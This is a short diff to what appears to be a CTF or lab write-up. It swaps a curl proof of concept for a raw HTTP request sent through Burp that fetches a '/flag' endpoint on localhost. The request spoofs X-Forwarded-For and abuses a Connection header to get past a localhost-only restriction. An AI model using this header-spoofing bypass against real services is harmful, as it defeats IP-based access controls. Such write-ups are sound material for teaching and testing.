@@ -40,6 +40,12 @@ def flag():
 ```
 
 ### POC
-``` bash
-curl "http://127.0.0.1:8089/flag" -H "X-Forwarded-For: 127.0.0.1" -H "Connection: X-Forwarded-For"
+Use Burp to send the request.
+```
+GET /flag HTTP/1.1
+Host: 127.0.0.1
+X-Forwarded_For: 127.0.0.1
+Connection: X-Forwarded-For
+
+
 ```
